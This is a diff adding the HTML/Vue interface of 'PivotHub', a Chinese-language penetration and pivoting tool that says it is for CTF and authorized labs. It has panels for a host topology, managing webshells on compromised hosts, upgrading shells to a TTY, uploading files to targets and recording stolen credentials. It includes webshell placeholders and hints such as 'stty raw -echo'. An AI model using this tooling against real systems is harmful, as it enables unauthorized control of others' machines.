@@ -1,0 +1,2211 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>PivotHub · 链透中枢 — 多层内网渗透辅助工具</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='7' fill='%230a1015'/><path d='M8 24V8h4v16z' fill='%2300e5a0'/><path d='M15 24V8h5a6 6 0 010 12h-2v4z' fill='%2300e5a0'/></svg>" />
+<link rel="stylesheet" href="assets/css/theme.css" />
+<link rel="stylesheet" href="assets/css/layout.css" />
+<link rel="stylesheet" href="assets/css/components.css?v=20260909" />
+</head>
+<body>
+<div id="app" v-cloak>
+  <div class="boot-screen">
+    <div class="boot-logo">PivotHub</div>
+    <div class="boot-text">正在加载前端资源…</div>
+  </div>
+</div>
+
+<!-- ============================= 模板：外壳 ============================= -->
+<script type="text/x-template" id="tpl-app">
+  <div class="shell">
+    <!-- 顶栏 -->
+    <header class="topbar">
+      <div class="brand">
+        <span class="brand-mark">PH</span>
+        <div class="brand-text">
+          <strong>PivotHub</strong>
+          <small>链透中枢 · 多层内网渗透辅助工具</small>
+        </div>
+      </div>
+
+      <div class="topbar-project">
+        <span class="topbar-label">项目</span>
+        <select class="input input-sm" v-model="projectId">
+          <option v-for="p in projects" :key="p.id" :value="p.id">{{ p.name }}</option>
+        </select>
+        <button class="btn btn-xs btn-ghost" title="新建项目（干净工作区）" @click="createProject">＋ 新建</button>
+        <span class="badge" :class="'badge-' + (timer.running ? 'ok' : 'idle')">
+          {{ timer.running ? '计时中' : '已暂停' }}
+        </span>
+        <span class="topbar-clock mono">{{ clockText }}</span>
+        <button class="btn btn-xs btn-ghost" @click="toggleTimer">
+          {{ timer.running ? '暂停' : '继续' }}
+        </button>
+      </div>
+
+      <div class="topbar-right">
+        <div class="stat-inline" title="已控主机 / 已发现主机">
+          <span class="stat-inline-k">HOST</span>
+          <span class="stat-inline-v mono">{{ stats.ownedHosts }}/{{ stats.hosts }}</span>
+        </div>
+        <div class="stat-inline" title="存活代理链路">
+          <span class="stat-inline-k">LINK</span>
+          <span class="stat-inline-v mono">{{ stats.aliveLinks }}/{{ stats.links }}</span>
+        </div>
+        <div class="stat-inline" title="Flag 进度">
+          <span class="stat-inline-k">FLAG</span>
+          <span class="stat-inline-v mono">{{ stats.flags }}/{{ stats.flagsTotal }}</span>
+        </div>
+        <div class="conn-chip" :class="ws.online ? 'is-on' : 'is-off'">
+          <i class="dot"></i>{{ ws.online ? 'WS 已连接' : 'WS 断开' }}
+        </div>
+        <button class="btn btn-xs btn-ghost" @click="openGlobalSettings()">
+          <svg class="ico" viewBox="0 0 24 24" v-html="icon('settings')"></svg>
+          全局设置
+        </button>
+        <button class="btn btn-xs btn-ghost" @click="ui.disclaimerOpen = true">合规声明</button>
+      </div>
+    </header>
+
+    <div class="shell-body">
+      <!-- 侧边栏 -->
+      <nav class="sidebar">
+        <div class="nav-group" v-for="group in navGroups" :key="group.title">
+          <div class="nav-group-title">{{ group.title }}</div>
+          <button
+            v-for="item in group.items"
+            :key="item.key"
+            class="nav-item"
+            :class="{ 'is-active': ui.view === item.key }"
+            @click="ui.view = item.key">
+            <svg class="ico" viewBox="0 0 24 24" v-html="icon(item.icon)"></svg>
+            <span class="nav-label">{{ item.label }}</span>
+            <span class="nav-badge mono" v-if="navBadge(item.key)">{{ navBadge(item.key) }}</span>
+          </button>
+        </div>
+        <div class="sidebar-foot">
+          <div class="foot-line"><span>后端</span><b class="mono">{{ ws.online ? '127.0.0.1:8000' : '未连接' }}</b></div>
+          <div class="foot-line"><span>数据</span><b class="mono">SQLite · {{ stats.hosts }} 节点</b></div>
+        </div>
+      </nav>
+
+      <!-- 主区 -->
+      <main class="main">
+        <topology-view v-if="ui.view === 'topology'"></topology-view>
+        <shell-view v-else-if="ui.view === 'shell'"></shell-view>
+        <recon-view v-else-if="ui.view === 'recon'"></recon-view>
+        <reverse-view v-else-if="ui.view === 'reverse'"></reverse-view>
+        <files-view v-else-if="ui.view === 'files'"></files-view>
+        <generator-view v-else-if="ui.view === 'generator'"></generator-view>
+        <proxy-view v-else-if="ui.view === 'proxy'"></proxy-view>
+        <asset-view v-else-if="ui.view === 'asset'"></asset-view>
+        <cred-view v-else-if="ui.view === 'cred'"></cred-view>
+        <flag-view v-else-if="ui.view === 'flag'"></flag-view>
+        <timeline-view v-else-if="ui.view === 'timeline'"></timeline-view>
+        <cheat-view v-else-if="ui.view === 'cheat'"></cheat-view>
+        <export-view v-else-if="ui.view === 'export'"></export-view>
+        <dashboard-view v-else></dashboard-view>
+      </main>
+    </div>
+
+    <!-- 全局弹窗 / 提示 -->
+    <modal-layer></modal-layer>
+    <toast-layer></toast-layer>
+
+    <!-- 文件编辑（全局：Shell 管理侧栏 / 文件管理视图共用） -->
+    <div class="modal-mask" v-if="fileEdit.open" @click.self="closeFileEdit()">
+      <div class="modal modal-wide">
+        <div class="modal-head">
+          <h3 class="mono ellipsis" :title="fileEdit.path">{{ fileEdit.name }} <span class="muted tiny">{{ fileEdit.path }}</span></h3>
+          <button class="icon-btn" @click="closeFileEdit()">×</button>
+        </div>
+        <div class="modal-body">
+          <p class="muted" v-if="fileEdit.loading">读取中…</p>
+          <textarea v-else class="input mono textarea-lg" v-model="fileEdit.content" spellcheck="false"></textarea>
+        </div>
+        <div class="modal-foot">
+          <button class="btn" @click="closeFileEdit()">取消</button>
+          <button class="btn btn-primary" :disabled="fileEdit.loading || fileEdit.saving" @click="saveFileEdit()">
+            {{ fileEdit.saving ? '保存中…' : '保存到目标' }}
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- 启动合规提醒：半透明浮层，不挡操作，1 秒后自动消失；完整声明见顶栏「合规声明」 -->
+    <div class="disclaimer-brief" v-if="ui.disclaimerBrief" @click="ui.disclaimerBrief = false">
+      <svg class="ico" viewBox="0 0 24 24" v-html="icon('shield')"></svg>
+      <span>仅用于 CTF 竞赛 / 授权靶场 / 教学演示 · 禁止对未授权的真实目标使用</span>
+    </div>
+
+    <!-- 合规声明（顶栏入口按需打开） -->
+    <div class="modal-mask" v-if="ui.disclaimerOpen" @click.self="ui.disclaimerOpen = false">
+      <div class="modal modal-narrow">
+        <div class="modal-head">
+          <h3>合规声明</h3>
+          <button class="icon-btn" @click="ui.disclaimerOpen = false">×</button>
+        </div>
+        <div class="modal-body">
+          <div class="warn-box">
+            <svg class="ico" viewBox="0 0 24 24" v-html="icon('shield')"></svg>
+            <div>
+              <p><b>本工具仅用于 CTF 竞赛、授权靶场与教学演示。</b></p>
+              <p class="muted">禁止对任何未授权的真实目标使用。面板仅监听 127.0.0.1，不对外暴露；所有代理二进制传输应在受控实验环境内进行。使用者需自行承担合规责任。</p>
+            </div>
+          </div>
+          <ul class="check-list">
+            <li>面板与目标环境的通信全部走 Shell / 代理通道，不依赖外网</li>
+            <li>不内置任何针对真实目标的 exploit</li>
+            <li>项目数据仅存本地 SQLite，不上传云端</li>
+          </ul>
+        </div>
+        <div class="modal-foot">
+          <button class="btn btn-primary" @click="ui.disclaimerOpen = false">我已了解，仅用于授权场景</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- 全局设置：攻击机网络（面板所在机器就是攻击机；反弹/回连命令的唯一地址来源） -->
+    <div class="modal-mask" v-if="ui.modal === 'global-cfg'" @click.self="ui.modal = null">
+      <div class="modal modal-narrow">
+        <div class="modal-head">
+          <h3>
+            <svg class="ico" viewBox="0 0 24 24" v-html="icon('settings')"></svg>
+            全局设置 · 攻击机网络
+          </h3>
+          <button class="icon-btn" @click="ui.modal = null">×</button>
+        </div>
+        <div class="modal-body form-stack">
+          <p class="muted tiny">
+            <b>面板所在的机器就是攻击机</b>。靶机反弹 Shell / 代理回连时连的就是这里的地址 ——
+            必须填本机在靶场网络中的 IP（如 VPN 地址），写 <code>127.0.0.1</code> 一定连不回来。
+            拓扑里的「攻击端本机」节点、新建项目的初始节点、所有回连命令都取这个值。
+          </p>
+          <div class="form-row">
+            <label class="field">
+              <span>攻击机 IP（靶场网络内）</span>
+              <input class="input mono" v-model="gcfg.ip" placeholder="如 10.0.0.5" />
+            </label>
+            <label class="field">
+              <span>网卡 / 接口</span>
+              <input class="input mono" v-model="gcfg.iface" placeholder="如 tun0 / WLAN" />
+            </label>
+          </div>
+          <div class="form-row">
+            <label class="field">
+              <span>所在网段</span>
+              <input class="input mono" v-model="gcfg.segment" placeholder="如 10.0.0.0/24" />
+            </label>
+            <label class="field">
+              <span>备注</span>
+              <input class="input" v-model="gcfg.note" placeholder="如：VPN 接入" />
+            </label>
+          </div>
+          <div class="callout" v-if="gcfg.detected.length">
+            <b>本机检测到的地址</b>
+            <p class="muted tiny mono">{{ gcfg.detected.join('  /  ') }}</p>
+          </div>
+          <label class="field checkbox-line">
+            <input type="checkbox" v-model="gcfg.applyAll" />
+            <span>同步到所有项目（新建项目也会继承这份配置）</span>
+          </label>
+        </div>
+        <div class="modal-foot">
+          <button class="btn" :disabled="gcfg.detecting" @click="detectLocalIp()">{{ gcfg.detecting ? '检测中…' : '检测本机 IP' }}</button>
+          <button class="btn" @click="ui.modal = null">取消</button>
+          <button class="btn btn-primary" @click="saveGlobalSettings()">保存</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</script>
+
+<!-- ============================= 模板：拓扑 ============================= -->
+<script type="text/x-template" id="tpl-topology">
+  <div class="view view-topology">
+    <div class="view-head">
+      <div>
+        <h2>网络拓扑 · 跳板链</h2>
+        <p class="muted">节点 = 主机（权限 / Shell 状态 / Flag 数），边 = 代理链路（工具 / 方向 / 状态）。拖拽调整布局，点击节点打开操作面板。</p>
+      </div>
+      <div class="view-head-actions">
+        <div class="seg">
+          <button v-for="l in layoutModes" :key="l.key" class="seg-btn" :class="{ 'is-active': topo.layout === l.key }" @click="topo.setLayout(l.key)">{{ l.label }}</button>
+        </div>
+        <button class="btn btn-sm" @click="topo.fit()">自适应</button>
+        <button class="btn btn-sm" @click="topo.resetPositions()">重置布局</button>
+      </div>
+    </div>
+
+    <div class="topo-wrap">
+      <div class="topo-canvas">
+        <div ref="chartEl" class="chart-el"></div>
+        <div class="topo-legend">
+          <div class="legend-row"><i class="lg-line is-alive"></i>Socks 链路</div>
+          <div class="legend-row"><i class="lg-line is-relay"></i>多级中继</div>
+          <div class="legend-row"><i class="lg-line is-fwd"></i>端口转发</div>
+          <div class="legend-row"><i class="lg-line is-dead"></i>链路断开</div>
+          <div class="legend-row"><i class="lg-node is-owned"></i>已控主机</div>
+          <div class="legend-row"><i class="lg-node"></i>已发现主机</div>
+        </div>
+        <div class="topo-toolbar">
+          <label class="switch">
+            <input type="checkbox" v-model="topo.showLabels" @change="topo.render()" />
+            <span>边标签</span>
+          </label>
+          <label class="switch">
+            <input type="checkbox" v-model="topo.dimOffline" @change="topo.render()" />
+            <span>淡化离线</span>
+          </label>
+        </div>
+      </div>
+
+      <aside class="topo-side">
+        <!-- 节点详情 -->
+        <div v-if="selected.host" class="panel">
+          <div class="panel-head">
+            <h3>{{ selected.host.ip }}</h3>
+            <span class="badge" :class="'badge-' + (selected.host.owned ? 'ok' : 'idle')">{{ selected.host.owned ? '已控' : '已发现' }}</span>
+          </div>
+          <div class="kv-grid">
+            <div><span>主机名</span><b class="mono">{{ selected.host.hostname || '-' }}</b></div>
+            <div><span>操作系统</span><b>{{ selected.host.os }}</b></div>
+            <div><span>层级</span><b>{{ selected.host.layer }}</b></div>
+            <div><span>网段</span><b class="mono">{{ selected.host.segment }}</b></div>
+            <div><span>当前权限</span><b :class="privClass(selected.host.privilege)">{{ selected.host.privilege || '无' }}</b></div>
+            <div><span>入口端口</span><b class="mono">{{ (selected.host.ports || []).join(', ') || '-' }}</b></div>
+          </div>
+          <div class="note-line" v-if="selected.host.note">{{ selected.host.note }}</div>
+
+          <div class="mini-stats">
+            <div><span>Shell</span><b class="mono">{{ shellsOf(selected.host.id).length }}</b></div>
+            <div><span>凭据</span><b class="mono">{{ credsOf(selected.host.id).length }}</b></div>
+            <div><span>Flag</span><b class="mono">{{ flagsOf(selected.host.id).length }}</b></div>
+          </div>
+
+          <div class="action-grid">
+            <button class="btn btn-sm" @click="openTerminal(selected.host)">
+              <svg class="ico" viewBox="0 0 24 24" v-html="icon('terminal')"></svg> 开终端
+            </button>
+            <button class="btn btn-sm" @click="goto('proxy', { detectHostId: selected.host.id })">
+              <svg class="ico" viewBox="0 0 24 24" v-html="icon('radar')"></svg> 出网探测
+            </button>
+            <button class="btn btn-sm" @click="goto('proxy', { pivotFrom: selected.host.id })">
+              <svg class="ico" viewBox="0 0 24 24" v-html="icon('share')"></svg> 从此起代理
+            </button>
+            <button class="btn btn-sm" @click="openCredModal(selected.host.id)">
+              <svg class="ico" viewBox="0 0 24 24" v-html="icon('key')"></svg> 登记凭据
+            </button>
+            <button class="btn btn-sm" @click="openFlagModal(selected.host.id)">
+              <svg class="ico" viewBox="0 0 24 24" v-html="icon('flag')"></svg> 记 Flag
+            </button>
+            <button class="btn btn-sm" @click="openNoteModal(selected.host.id)">
+              <svg class="ico" viewBox="0 0 24 24" v-html="icon('note')"></svg> 加笔记
+            </button>
+          </div>
+
+          <div class="panel-sub" v-if="shellsOf(selected.host.id).length">
+            <h4>Shell 会话</h4>
+            <div class="list-row" v-for="s in shellsOf(selected.host.id)" :key="s.id">
+              <span class="dot" :class="s.alive ? 'is-on' : 'is-off'"></span>
+              <span class="mono grow">{{ s.type }} · {{ s.url }}</span>
+              <button class="btn btn-xs btn-ghost" @click="openTerminalById(s.id)">连接</button>
+            </div>
+          </div>
+          <div class="panel-sub" v-if="credsOf(selected.host.id).length">
+            <h4>凭据</h4>
+            <div class="list-row" v-for="c in credsOf(selected.host.id)" :key="c.id">
+              <span class="mono grow">{{ c.username }} / {{ c.secret }}</span>
+              <span class="badge badge-info">{{ c.kind }}</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- 链路详情 -->
+        <div v-else-if="selected.link" class="panel">
+          <div class="panel-head">
+            <h3>代理链路</h3>
+            <span class="badge" :class="'badge-' + (selected.link.status === 'alive' ? 'ok' : selected.link.status === 'error' ? 'err' : 'idle')">{{ statusText(selected.link.status) }}</span>
+          </div>
+          <div class="kv-grid">
+            <div><span>工具</span><b>{{ selected.link.tool }}</b></div>
+            <div><span>方向</span><b>{{ selected.link.direction }}</b></div>
+            <div><span>入口</span><b class="mono">{{ ipOf(selected.link.fromHostId) }}</b></div>
+            <div><span>出口</span><b class="mono">{{ ipOf(selected.link.toHostId) }}</b></div>
+            <div><span>本地 Socks</span><b class="mono">{{ selected.link.localSocks || '-' }}</b></div>
+            <div><span>覆盖网段</span><b class="mono">{{ selected.link.targetSegment || '-' }}</b></div>
+          </div>
+          <div class="action-grid">
+            <button class="btn btn-sm" @click="testLink(selected.link.id)">健康检查</button>
+            <button class="btn btn-sm" @click="restartLink(selected.link.id)">重拉链路</button>
+            <button class="btn btn-sm btn-danger" @click="stopLink(selected.link.id)">销毁</button>
+            <button class="btn btn-sm btn-ghost" @click="removeLink(selected.link.id)">删除记录</button>
+          </div>
+        </div>
+
+        <div v-else class="panel panel-empty">
+          <svg class="ico ico-lg" viewBox="0 0 24 24" v-html="icon('share')"></svg>
+          <p>点击拓扑上的节点或链路<br />查看详情与可用操作</p>
+          <p class="muted">也可在空白处点击取消选中</p>
+        </div>
+
+        <!-- 网段分区 -->
+        <div class="panel">
+          <div class="panel-head"><h3>网段分区</h3></div>
+          <div class="seg-row" v-for="sg in segments" :key="sg.segment">
+            <i class="swatch" :style="{ background: sg.color }"></i>
+            <span class="mono grow">{{ sg.segment }}</span>
+            <span class="muted">{{ sg.count }} 台</span>
+          </div>
+        </div>
+      </aside>
+    </div>
+  </div>
+</script>
+
+<!-- ============================= 模板：Shell 管理 ============================= -->
+<script type="text/x-template" id="tpl-shell">
+  <div class="view view-shell view-fill">
+    <div class="view-head">
+      <div>
+        <h2>Shell 管理</h2>
+        <p class="muted">连接登记 · 连通性测试 · 存活心跳 · 虚拟终端 · 终端固化 · 文件管理</p>
+      </div>
+      <div class="view-head-actions">
+        <button class="btn btn-sm" @click="heartbeatAll()">
+          <svg class="ico" viewBox="0 0 24 24" v-html="icon('activity')"></svg> 全部心跳
+        </button>
+        <button class="btn btn-sm btn-primary" @click="openAdd()">
+          <svg class="ico" viewBox="0 0 24 24" v-html="icon('plus')"></svg> 添加 Shell
+        </button>
+      </div>
+    </div>
+
+    <div class="split">
+      <div class="split-main">
+        <div class="table-wrap">
+          <table class="table">
+            <thead>
+              <tr>
+                <th style="width:56px">状态</th>
+                <th>类型</th>
+                <th>URL / 端点</th>
+                <th>密码</th>
+                <th>宿主</th>
+                <th>终端形态</th>
+                <th>延迟</th>
+                <th>最后心跳</th>
+                <th style="width:150px">操作</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr v-for="s in shells" :key="s.id" :class="{ 'is-selected': ui.selectedShellId === s.id }" @click="ui.selectedShellId = s.id">
+                <td><span class="dot" :class="s.alive ? 'is-on' : 'is-off'" :title="s.alive ? '存活' : '断线'"></span></td>
+                <td><span class="badge badge-info">{{ s.type }}</span></td>
+                <td class="mono ellipsis" :title="s.url">{{ s.url }}</td>
+                <td class="mono">{{ s.pass || '-' }}</td>
+                <td class="mono">{{ ipOf(s.hostId) }}</td>
+                <td>
+                  <span class="badge" :class="s.stable ? 'badge-ok' : 'badge-idle'">{{ s.stable ? '已固化 TTY' : '伪终端' }}</span>
+                </td>
+                <td class="mono" :class="latencyClass(s)">{{ s.alive ? s.latency + 'ms' : '—' }}</td>
+                <td class="muted">{{ s.lastBeat }}</td>
+                <td>
+                  <button class="btn btn-xs" @click.stop="test(s)">测试</button>
+                  <button class="btn btn-xs" @click.stop="openTerminal(s.id)">终端</button>
+                  <button class="btn btn-xs btn-danger" @click.stop="remove(s)">删除</button>
+                </td>
+              </tr>
+              <tr v-if="!shells.length">
+                <td colspan="9" class="empty-cell">暂无 Shell 会话，点击右上角「添加 Shell」登记入口马</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <!-- 虚拟终端 -->
+        <div class="panel terminal-panel" v-if="activeShell">
+          <div class="panel-head">
+            <h3>
+              <span class="dot" :class="activeShell.alive ? 'is-on' : 'is-off'"></span>
+              虚拟终端 · <span class="mono">{{ ipOf(activeShell.hostId) }}</span>
+              <span class="badge badge-info">{{ activeShell.type }}</span>
+              <span class="badge" :class="modeBadge.cls">{{ modeBadge.text }}</span>
+            </h3>
+            <div class="row-gap">
+              <span class="muted mono">{{ activeShell.privilege || '?' }}@{{ activeShell.hostname || 'target' }}</span>
+              <button class="btn btn-xs" v-if="activeShell.kind !== 'reverse'" @click="goto('reverse', { revShellId: activeShell.id })">
+                <svg class="ico" viewBox="0 0 24 24" v-html="icon('share')"></svg>
+                反弹 Shell
+              </button>
+              <template v-if="termState.rawMode">
+                <span class="badge badge-ok" title="直接连接目标 PTY：真实提示符、交互程序、Ctrl+C 全部可用">原始交互</span>
+                <button class="btn btn-xs btn-primary"
+                        v-if="termState.detected && !termState.caps.tty && !activeShell.stable"
+                        @click="upgradePty()"
+                        title="当前会话没有 PTY：Ctrl+C 不会中断命令、vim/su 等不可用。点此在通道内套一层 PTY（python3 / script）">获取 PTY</button>
+                <button class="btn btn-xs" @click="sendKey('ctrl-c')"
+                        title="中断当前命令（无 PTY 时会改从同主机其他会话结束该进程）">Ctrl+C</button>
+                <button class="btn btn-xs" @click="sendKey('tab')" title="发送 Tab（补全）">Tab</button>
+                <button class="btn btn-xs" @click="sendKey('ctrl-d')" title="发送 Ctrl+D（EOF）">Ctrl+D</button>
+              </template>
+              <button class="btn btn-xs btn-primary" @click="ui.modal = 'tty-fix'">
+                <svg class="ico" viewBox="0 0 24 24" v-html="icon('terminal')"></svg>
+                终端固化
+                <span class="badge" :class="ttyMode === 'full' ? 'badge-ok' : 'badge-warn'" style="margin-left:2px">{{ ttyMode === 'full' ? '已固化' : '待固化' }}</span>
+              </button>
+              <button class="btn btn-xs btn-ghost" @click="clearTerm()">清屏</button>
+              <button class="btn btn-xs btn-ghost" @click="killTerm()">关闭</button>
+            </div>
+          </div>
+
+          <div class="term-col">
+            <!-- 原始交互终端：反弹通道直连目标 PTY，真实提示符原样显示 -->
+            <div class="term term-raw" ref="termEl" @click="focusTerm()" v-if="termState.rawMode">
+              <div class="term-line" v-for="(l, i) in termState.rawLines" :key="i">{{ l }}</div>
+              <div class="term-input-row">
+                <span class="term-ps1" title="输入整行后回车发送到目标 PTY">›</span>
+                <input
+                  class="term-input"
+                  ref="termInputEl"
+                  v-model="termInput"
+                  @keydown.enter.prevent="submitTerm()"
+                  @keydown.up.prevent="histPrev()"
+                  @keydown.down.prevent="histNext()"
+                  @keydown.tab.prevent="sendKey('tab')"
+                  spellcheck="false"
+                  autocomplete="off"
+                  placeholder="输入命令回车发送（交互程序提示如 Password: 也在这里输入）" />
+              </div>
+            </div>
+            <!-- WebShell 伪终端：哨兵执行，逐条回显 -->
+            <div class="term" ref="termEl" @click="focusTerm()" v-else>
+              <div class="term-line" v-for="(l, i) in activeTerm.lines" :key="i" :class="'term-' + l.kind">
+                <span v-if="l.kind === 'in'" class="term-ps1">{{ ps1 }}&nbsp;</span>
+                <span v-html="l.html"></span>
+              </div>
+              <div class="term-input-row">
+                <span class="term-ps1">{{ ps1 }}&nbsp;</span>
+                <input
+                  class="term-input"
+                  ref="termInputEl"
+                  v-model="termInput"
+                  @keydown.enter.prevent="submitTerm()"
+                  @keydown.up.prevent="histPrev()"
+                  @keydown.down.prevent="histNext()"
+                  @keydown.tab.prevent="complete()"
+                  spellcheck="false"
+                  autocomplete="off"
+                  placeholder="输入命令，Tab 补全，↑↓ 翻历史" />
+              </div>
+            </div>
+            <!-- 命令提示条：固定在本面板最底部 -->
+            <div class="term-hints">
+              <span class="muted">可试：</span>
+              <button class="chip" v-for="c in hintCommands" :key="c" @click="termInput = c; focusTerm()">{{ c }}</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- 文件管理 -->
+      <aside class="split-side" v-if="activeShell">
+        <div class="panel file-panel">
+          <div class="panel-head">
+            <h3>文件管理</h3>
+            <button class="btn btn-xs" @click="upload()">上传</button>
+          </div>
+          <div class="crumb mono">
+            <button class="crumb-btn" v-for="(c, i) in file.crumbs" :key="i" @click="cd(i)">{{ c }}{{ i ? '/' : '' }}</button>
+          </div>
+          <div class="file-list">
+            <div class="file-row" v-for="f in file.entries" :key="f.name" @click="f.dir ? cdPath(f.name) : openFile(f)">
+              <svg class="ico" viewBox="0 0 24 24" v-html="icon(f.dir ? 'folder' : 'file')"></svg>
+              <span class="grow mono ellipsis">{{ f.name }}</span>
+              <span class="muted mono">{{ f.dir ? 'DIR' : f.size }}</span>
+            </div>
+            <p class="muted tiny" v-if="file.loading">加载中…</p>
+            <p class="muted tiny text-err" v-else-if="file.error">列目录失败：{{ file.error }}</p>
+            <p class="muted tiny" v-else-if="!file.entries.length">目录为空</p>
+          </div>
+          <div class="upload-bar" v-if="file.uploading">
+            <span class="mono grow">上传 {{ file.uploading }}…{{ file.phase ? ' · ' + file.phase : '' }}</span>
+            <div class="progress"><i :style="{ width: file.progress + '%' }"></i></div>
+          </div>
+          <p class="muted tiny">完整功能见左侧「文件管理」；上传通道「{{ uploadModeText() }}」可在文件管理视图切换（HTTP 拉取 / 分片直传 / 自动）。</p>
+        </div>
+      </aside>
+    </div>
+
+    <!-- 添加 Shell 弹窗 -->
+    <div class="modal-mask" v-if="ui.modal === 'shell-add'" @click.self="ui.modal = null">
+      <div class="modal">
+        <div class="modal-head">
+          <h3>添加 Shell 连接</h3>
+          <button class="icon-btn" @click="ui.modal = null">×</button>
+        </div>
+        <div class="modal-body form-grid">
+          <label class="field">
+            <span>马类型</span>
+            <select class="input" v-model="form.type">
+              <option v-for="t in shellTypes" :key="t">{{ t }}</option>
+            </select>
+          </label>
+          <label class="field">
+            <span>密码 / 密钥</span>
+            <input class="input" v-model="form.pass" placeholder="如 rebeyond" />
+          </label>
+          <label class="field field-full">
+            <span>URL / 端点</span>
+            <input class="input" v-model="form.url" placeholder="http://10.10.20.11/upload/shell.php" />
+          </label>
+          <label class="field">
+            <span>编码器</span>
+            <select class="input" v-model="form.encoder">
+              <option v-for="e in encoders" :key="e">{{ e }}</option>
+            </select>
+          </label>
+          <label class="field">
+            <span>归属主机</span>
+            <select class="input" v-model="form.hostId">
+              <option v-for="h in hosts" :key="h.id" :value="h.id">{{ h.ip }}（{{ h.layer }}）</option>
+            </select>
+          </label>
+          <label class="field field-full checkbox-line">
+            <input type="checkbox" v-model="form.autoCollect" />
+            <span>连接成功后自动回传基础信息（whoami / uname / ip / 网卡）并入库资产表</span>
+          </label>
+        </div>
+        <div class="modal-foot">
+          <span class="grow muted tiny" v-if="form.testResult" :class="form.testResult.ok ? 'text-ok' : 'text-err'">{{ form.testResult.msg }}</span>
+          <button class="btn" @click="testForm()">连通性测试</button>
+          <button class="btn btn-primary" @click="save()">保存并连接</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- 终端固化弹窗（WebShell → 稳定交互 TTY） -->
+    <div class="modal-mask" v-if="ui.modal === 'tty-fix'" @click.self="ui.modal = null">
+      <div class="modal modal-wide modal-fix">
+        <div class="modal-head">
+          <h3>
+            <svg class="ico" viewBox="0 0 24 24" v-html="icon('terminal')"></svg>
+            终端固化 · <span class="mono">{{ ipOf(activeShell.hostId) }}</span>
+            <span class="badge badge-info">{{ activeShell.type }}</span>
+            <span class="badge" :class="modeBadge.cls">{{ modeBadge.text }}</span>
+          </h3>
+          <button class="icon-btn" @click="ui.modal = null">×</button>
+        </div>
+
+        <div class="modal-body fix-body">
+          <!-- 左：状态与检测 -->
+          <div class="fix-side">
+            <div class="tty-state" :class="'is-' + ttyMode">
+              <div class="tty-state-k">当前终端形态</div>
+              <div class="tty-state-v">{{ termState.modeLabel }}</div>
+              <div class="tty-caps" v-if="termState.detected">
+                <span class="cap" :class="termState.caps.tty ? 'is-ok' : 'is-no'">TTY {{ termState.caps.tty ? '✓' : '✗' }}</span>
+                <span class="cap" :class="termState.caps.term === 'dumb' ? 'is-no' : 'is-ok'">TERM {{ termState.caps.term || '?' }}</span>
+                <span class="cap" :class="termState.caps.python ? 'is-ok' : 'is-no'">python</span>
+                <span class="cap" :class="termState.caps.script ? 'is-ok' : 'is-no'">script</span>
+                <span class="cap" :class="termState.caps.socat ? 'is-ok' : 'is-no'">socat</span>
+                <span class="cap" :class="termState.caps.nc ? 'is-ok' : 'is-no'">nc</span>
+              </div>
+              <p class="muted tiny" v-else>WebShell 是伪终端：无 TTY、无 job control，<code>su</code> / <code>ssh</code> / <code>vim</code> / <code>top</code> 无法正常使用。先做交互能力检测，再选技法固化。</p>
+            </div>
+
+            <div class="tty-actions">
+              <button class="btn btn-sm btn-primary btn-block" @click="detectTty()" :disabled="termState.detecting">
+                {{ termState.detecting ? '检测中…' : '① 交互能力检测' }}
+              </button>
+              <button class="btn btn-sm btn-block" :class="ttyMode === 'full' ? 'btn-primary' : ''" @click="finishTty()" :disabled="ttyMode !== 'full'">
+                ② Ctrl+Z → stty raw 收尾
+              </button>
+            </div>
+
+            <div class="tty-tip">
+              <b>为什么必须固化？</b>
+              <p class="muted tiny">WebShell 每次请求都是独立进程，没有控制终端：<code>Ctrl+C</code> 会杀掉马本身、<code>su</code> 拒绝执行、<code>vim</code>/<code>top</code> 花屏。拿到 PTY 后还要 <code>stty raw -echo</code> 才能恢复方向键与退格。</p>
+            </div>
+
+            <div class="panel-sub" v-if="appliedList.length">
+              <h4>本会话已应用技法</h4>
+              <div class="list-row" v-for="a in appliedList" :key="a.id">
+                <span class="dot is-on"></span>
+                <span class="grow">{{ a.name }}</span>
+                <span class="muted mono">{{ a.time }}</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- 右：技法库 -->
+          <div class="fix-main">
+            <div class="fix-toolbar">
+              <div class="seg">
+                <button class="seg-btn" :class="{ 'is-active': fixFilter === 'all' }" @click="fixFilter = 'all'">全部技法</button>
+                <button class="seg-btn" :class="{ 'is-active': fixFilter === 'applied' }" @click="fixFilter = 'applied'">已应用 {{ appliedList.length }}</button>
+              </div>
+              <span class="muted tiny">按目标平台自动匹配（{{ termState.caps.os === 'windows' ? 'Windows' : 'Linux' }}）</span>
+            </div>
+
+            <div class="tty-list">
+              <div class="tty-card" v-for="f in fixes" :key="f.id" :class="{ 'is-applied': isApplied(f.id) }">
+                <div class="tty-card-head">
+                  <b>{{ f.name }}</b>
+                  <span class="badge" :class="'badge-' + (f.risk === 'low' ? 'ok' : f.risk === 'medium' ? 'warn' : 'err')">{{ f.risk === 'low' ? '低风险' : f.risk === 'medium' ? '中风险' : '高风险' }}</span>
+                </div>
+                <div class="tty-card-meta">
+                  <span class="muted tiny">可靠性 {{ f.reliability }}%</span>
+                  <span class="muted tiny" v-if="f.needs.length">依赖 {{ f.needs.join('/') }}</span>
+                  <span class="badge badge-ok" v-if="isApplied(f.id)">已应用</span>
+                </div>
+                <pre class="code-block code-xs">{{ fixCmdText(f) }}</pre>
+                <p class="muted tiny">{{ f.note }}</p>
+                <div class="tty-card-foot">
+                  <button class="btn btn-xs" @click="copyFix(f)">复制</button>
+                  <button class="btn btn-xs" @click="sendFix(f)">仅发送</button>
+                  <button class="btn btn-xs btn-primary" @click="applyFix(f)">执行并固化</button>
+                </div>
+              </div>
+              <p class="muted tiny" v-if="!fixes.length">暂无技法记录，先执行一次「交互能力检测」。</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="modal-foot">
